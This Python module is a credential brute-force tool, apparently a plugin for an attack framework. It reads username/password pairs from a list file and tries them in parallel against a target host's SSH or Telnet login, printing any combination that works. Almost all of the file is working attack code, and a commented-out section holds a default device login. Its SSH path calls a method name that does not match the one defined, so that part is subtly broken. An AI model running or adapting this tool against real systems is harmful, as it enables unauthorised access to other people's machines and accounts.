

from pssh.clients.ssh import ParallelSSHClient
from pssh.config import HostConfig
from pssh.exceptions import *

import os
import time
import telnetlib
import getpass
import threading
import datetime
import sys

sys.path.append('../')
from utils import WORKING_DIR, MODULES_DIR, LISTS_DIR, bcolors

class TelnetConnection(threading.Thread):
    def __init__(self, ip_addr, username, password):

        super(TelnetConnection, self).__init__()

        self.ip_addr = ip_addr
        self.username = username
        self.password = password
        self.successful = False

    def run(self):

        try:
            tn = telnetlib.Telnet(self.ip_addr)
            tn.read_until(b'login: ')
            tn.write(self.username.encode('ascii') + b'\n')
            tn.read_until(b'Password: ')
            tn.write(self.password.encode('ascii') + b'\n')
            shell = tn.expect([b'#'], timeout=5)
            self.successful = shell[1] != None
            tn.close()        
        except EOFError:
            self.successful = False
            
class SSH_TELNET_BRUTEFORCE:

    def name(self):
        return 'SSH_TELNET_BRUTEFORCE'

    def selected(self, localhost, target):
        self.localhost = localhost
        self.target = target

        self.connection_amt = 5

        self.current_connection_amt = 0

        self.TELNET_connections = []

        self.proto_type = None

        #sys.path.append('../')
        #from utils import WORKING_DIR, MODULES_DIR, LISTS_DIR, bcolors
        
    
        while self.proto_type == None:
            out = input('SSH or Telent? (s/t): ')
            if out == 'ssh' or out == 's' or out == '':
                self.proto_type = 'SSH'
            elif out == 'telnet' or out == 't':
                self.proto_type = 'TELNET'
            else:
                print('[!] Invalid Input. Select SSH or Telnet.') 
        
        self.cred_file = None
        
        while self.cred_file == None:
            out = input('Enter Credentials File: ')
            filepath = os.path.join(LISTS_DIR, out)
            if os.path.exists(filepath):
                self.cred_file = filepath   
            else:
                print('[!] Invalid Filepath.')

        self.parse()

    def parse(self):
        self.creds = [] 

        with open(self.cred_file, 'r') as f:
            data = f.readlines()

        for line in data:
            cred = line.strip().split()
            if len(cred) == 2:
                self.creds.append(cred)
        
        self.creds_size = len(self.creds)
        
    def attempt_SSH_connections(self, host, host_config):

        hosts = []
        for i in range(len(host_config)):
            hosts.append(host)

        conn = ParallelSSHClient(hosts, host_config=host_config)
        out = conn.run_command('exit', stop_on_errors=False)
        conn.join(out)

        return out
       
    def create_TELNET_connection(self, ip_addr, username, password):
        conn = TelnetConnection(ip_addr, username, password)
        conn.start()

        self.TELNET_connections.append(conn)
        self.current_connection_amt += 1

    def poll_TELNET_connections(self):
        for conn in self.TELNET_connections:
            conn.join()
            
            if conn.successful:
                print(f'\n[!] {bcolors.OKGREEN}Username/Password Combo found!{bcolors.ENDC}')
                print(f'[!] Username: {conn.username} Password: {conn.password}')
                return True
        
        self.TELNET_connections = []
        self.current_connection_amt = 0

        return False   

    def run(self):

        if self.proto_type == 'SSH':

            print(f'[!] {bcolors.HEADER}SSH Brute Force Started{bcolors.ENDC}')
            print(f'[*] Using Credential File: {self.cred_file}')
            print(f'[*] Contains {self.creds_size} Username/Password Combos')
            print(f'[*] Using {self.connection_amt} Threads for Connections')
    
            start_time = datetime.datetime.now()

            host_configs = []
            for idx, cred in enumerate(self.creds):

                host_configs.append(HostConfig(user=cred[0], password=cred[1]))    

                if (idx+1) % self.connection_amt == 0 or self.creds_size - idx + 1 < self.connection_amt:

                    end_time = datetime.datetime.now()
                    print(f'\r[*] Attempted {idx+1} Username/Password Combos\n[*] Time Elapsed: {end_time-start_time}\033[F', end='')

                    host_outs = self.attempt_connections(self.target.ip_addr, host_configs)         
                    
                    for i in range(0, len(host_outs)):
                        host_out = host_outs[i]
                        host_config = host_configs[i]                   
                        conn_fail = host_out.exception
                    
                        if conn_fail == None:
                            print(f'\n[!] {bcolors.OKGREEN}Username/Password Combo found!{bcolors.ENDC}')
                            print(f'[!] Username: {host_config.user} Password: {host_config.password}')
                            return
 
                    host_configs = []
                
            print(f'\n[!] {bcolors.FAIL}No Username/Password Combo found!{bcolors.ENDC}')

        elif self.proto_type == 'TELNET':

            print(f'[!] {bcolors.HEADER}TELNET Brute Force Started{bcolors.ENDC}')            
            print(f'[*] Using Credential File:: {self.cred_file}')
            print(f'[*] Contains {self.creds_size} Username/Passwoord Combos')
            print(f'[*] Using {self.connection_amt} Threads for Connections')
    
            start_time = datetime.datetime.now()

            combo_found = False
            for idx, cred in enumerate(self.creds):
                self.create_TELNET_connection(self.target.ip_addr, cred[0], cred[1])
                if self.current_connection_amt == self.connection_amt or self.creds_size - idx + 1 < self.connection_amt:
                    end_time = datetime.datetime.now()
                    print(f'\r[*] Attempted {idx+1} Username/Password Combos\n[*] Time Elapsed: {end_time-start_time}\033[F', end='')
                    if self.poll_TELNET_connections():
                        combo_found = True
                        break
            #self.poll_TELNET_connections()
            if not combo_found:
                print(f'\n[!] {bcolors.FAIL}No Username/Password Combo found!{bcolors.ENDC}')
            

            #out = self.attempt_TELNET_connection(self.target.ip_addr, 'debian', 'temppwd')
            #print(out)


            #targetIP = [self.target.ip_addr] # could be an array of all three ip addresses 
            #user = input('Username: ')
            #password = getpass.getpass(prompt='Password: ') # getpass() prompts the user for a pwd w/p echoing
            '''
            #for ip in targetIP:
                #try
            print("accessing device: ",targetIP[0])
            tn = telnetlib.Telnet(targetIP[0])
                #except OSError:
                    #continue
            print("cp1")
                # username
            tn.read_until(b"login: ")
            tn.write(user.encode('ascii') + b"\n")
                # password
            tn.read_until(b"password: ")
            tn.write(password.encode('ascii') + b"\n")
            print("cp2")

            tn.write(b"ls\n")
            tn.write(b"exit\n")
    
            print(tn.read_all().decode('ascii'))
            '''
